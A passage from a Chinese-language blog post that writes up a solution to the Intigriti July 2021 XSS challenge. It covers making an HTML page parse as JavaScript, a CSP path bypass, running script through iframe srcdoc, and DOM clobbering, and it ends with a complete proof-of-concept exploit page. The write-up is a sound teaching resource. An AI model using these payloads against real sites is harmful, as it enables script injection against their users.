&lt;p&gt;而在一些情況下，其實這語法也是 JS 的註解。不是我說的，是規格書說的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/xss-0721/spec.png&quot; alt=&quot;ECMAScript spec&quot;&gt;&lt;/p&gt;
&lt;p&gt;換句話說呢，我們可以利用這點，做出一個看起來像 HTML，但實際上也是合法 JS 的檔案！&lt;/p&gt;
&lt;p&gt;我最後做出來的 URL 是這樣：&lt;code&gt;https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;產生的 HTML 長這樣：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;&amp;lt;!-- 1; 這邊都是註解&lt;br&gt;top.alert(document.domain);/* --&gt;&lt;/span&gt; 這之後也都是註解了&lt;br&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;en&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第一行是註解，&lt;code&gt;/*&lt;/code&gt; 之後也都是註解，所以這一整段其實就是 &lt;code&gt;top.alert(document.domain);&lt;/code&gt; 的意思。&lt;/p&gt;
&lt;p&gt;不過這邊可以注意的是 htmledit.php 的 content type 不會變，依然還是 &lt;code&gt;text/html&lt;/code&gt;，之所以可以把它當作 JS 引入，是因為同源的關係。如果你是把一個不同源的 HTML 當作 JS 引入，就會被 &lt;a href=&quot;https://www.chromium.org/Home/chromium-security/corb-for-developers&quot;&gt;CORB&lt;/a&gt; 給擋下來。&lt;/p&gt;
&lt;p&gt;做到這邊，我們就可以讓 data 是 &lt;code&gt;&amp;lt;script src=&amp;quot;https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;這樣就會執行到 &lt;code&gt;text_tag.innerHTML = data&lt;/code&gt;，成功在頁面上放進去 script 還繞過了 CSP，完美！&lt;/p&gt;
&lt;p&gt;但可惜的是，還差一點點...&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E5%85%AB%E9%97%9C%EF%BC%9A%E5%9F%B7%E8%A1%8C%E5%8B%95%E6%85%8B%E6%8F%92%E5%85%A5%E7%9A%84-script&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E5%85%AB%E9%97%9C%EF%BC%9A%E5%9F%B7%E8%A1%8C%E5%8B%95%E6%85%8B%E6%8F%92%E5%85%A5%E7%9A%84-script&quot;&gt;#&lt;/a&gt; 第八關：執行動態插入的 script&lt;/h2&gt;
&lt;p&gt;就在我以為要過關的時候，卻發現我的 script 怎樣都不會執行。後來用&lt;a href=&quot;https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml&quot;&gt;關鍵字&lt;/a&gt;去查，才發現如果是用 innerHTML 插入 script 標籤，插入之後是不會去執行的。&lt;/p&gt;
&lt;p&gt;我試著用 &lt;code&gt;innerhtml import script&lt;/code&gt; 或是 &lt;code&gt;innerhtml script run&lt;/code&gt; 之類的關鍵字去找解法但都沒找到。&lt;/p&gt;
&lt;p&gt;最後，我是突然想到可以試試看 &lt;code&gt;&amp;lt;iframe srcdoc=&amp;quot;...&amp;quot;&amp;gt;&lt;/code&gt;，有種死馬當活馬醫的感覺，反正就試試看這樣行不行，沒有損失。&lt;/p&gt;
&lt;p&gt;結果沒想到就可以了。直接 assign 給 innerHTML 不行，但如果內容是：&lt;code&gt;&amp;lt;iframe srcdoc=&amp;quot;&amp;lt;script src=&#39;...&#39;&amp;gt;&amp;lt;/script&amp;gt;&amp;quot;&lt;/code&gt; 就可以，就會直接載入 script。&lt;/p&gt;
&lt;h2 id=&quot;%E6%9C%80%E5%BE%8C%E8%A7%A3%E6%B3%95&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%9C%80%E5%BE%8C%E8%A7%A3%E6%B3%95&quot;&gt;#&lt;/a&gt; 最後解法&lt;/h2&gt;
&lt;p&gt;最後再補充一件事情，我要送出答案之前發現我的答案在 Firefox 上面不能跑，原因是這段程式碼：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;a&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;a&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;admin&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 Chrome 上 &lt;code&gt;window.users&lt;/code&gt; 會是 HTMLCollection，但在 Firefox 上面只會拿到一個 a 元素，而 &lt;code&gt;window.users.admin&lt;/code&gt; 也就是 undefined。&lt;/p&gt;
&lt;p&gt;但這問題不大，只要多一層 iframe 就可以搞定：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;iframe&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;store&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;srcdoc&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;br&gt;  &amp;lt;iframe srcdoc=&lt;span class=&quot;token punctuation&quot;&gt;&#39;&lt;/span&gt;&amp;lt;a id=admin href=ftp://a:a@a#&gt;&amp;lt;/a&gt;&lt;span class=&quot;token punctuation&quot;&gt;&#39;&lt;/span&gt; name=users&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;iframe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我最後的答案長這樣：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;en&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;utf-8&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;XSS POC&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;  &lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; htmlUrl &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;https://challenge-0721.intigriti.io/htmledit.php?code=&#39;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; exploitSrc &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*&#39;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; insertPayload&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;script src=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;exploitSrc&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&gt;&amp;lt;\/script&gt;&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&lt;br&gt;      &amp;lt;a id=&quot;DEV&quot;&gt;&amp;lt;/a&gt;&lt;br&gt;      &amp;lt;iframe name=&quot;store&quot; srcdoc=&quot;&lt;br&gt;        &amp;lt;iframe srcdoc=&#39;&amp;lt;a id=admin href=ftp://a:a@a#&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;escape&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;insertPayload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&gt;&amp;lt;/a&gt;&#39; name=users&gt;&lt;br&gt;      &quot;&gt;&lt;br&gt;      &amp;lt;/iframe&gt;&lt;br&gt;      &amp;lt;iframe name=&quot;iframeConsole&quot; src=&quot;https://challenge-0721.intigriti.io/console.php&quot;&gt;&amp;lt;/iframe&gt;&lt;br&gt;    &lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; win &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;htmlUrl &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// wait for 3s to let window loaded&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token function&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; credentials &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        username&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        password&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;      win&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        cmd&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;reassign&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        message&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;          a&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;s&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;          b&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;u&#39;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        credentials&lt;br&gt;      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;      win&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        cmd&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;reassign&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        message&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;          a&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Z&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;          b&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;x+1&#39;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        credentials&lt;br&gt;      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;      win&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        cmd&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;logv&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        message&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Z&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        credentials&lt;br&gt;      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;%E5%85%B6%E4%BB%96%E8%A7%A3%E6%B3%95&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%85%B6%E4%BB%96%E8%A7%A3%E6%B3%95&quot;&gt;#&lt;/a&gt; 其他解法&lt;/h2&gt;
&lt;p&gt;我的方法是新開一個 window 來 post message，但其實也可以把自己作為 iframe，讓 htmledit.php embed，這樣的話其實也可以用 top.postMessage 去傳送訊息。&lt;/p&gt;
&lt;p&gt;「把自己 embed 在其他網頁中」這個是我很常忘記的一個方法。&lt;/p&gt;
&lt;p&gt;另一個非預期的解法也很神奇，是根據這一段：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[log]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這一段的重點是 &lt;code&gt;type=e.data.message.type&lt;/code&gt;，會設置一個 global variable 叫做 type，因此其實可以透過這邊傳入任意 payload，再去呼叫 logv 就好。就省去了把 payload 放在 a 上面那一大堆要處理的事情。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;我滿喜歡這次的這個題目，因為有種層層關卡的感覺，一關一關慢慢過，每當我以為要破關的時候，就又卡住了，直到最後才把所有關卡都解完，成功執行 XSS。&lt;/p&gt;
&lt;p&gt;從這個挑戰中，可以學習到的前端知識是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;DOM clobbering&lt;/li&gt;
&lt;li&gt;JS 的註解不是只有 // 跟 /* */&lt;/li&gt;
&lt;li&gt;CSP 針對 path 的繞過&lt;/li&gt;
&lt;li&gt;用 innerHTML 新增的 script 不會執行&lt;/li&gt;
&lt;li&gt;針對上一點，可以用 iframe srcdoc 來繞過（但一般狀況下應該新增一個 script tag 然後 append）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;從這個題目中可以學習或是複習滿多技巧的，CTF 跟這種挑戰有趣的點就在這邊，雖然說每樣東西拆開來可能都知道，但要怎麼精心串起來，是很考驗經驗跟功力的。&lt;/p&gt;
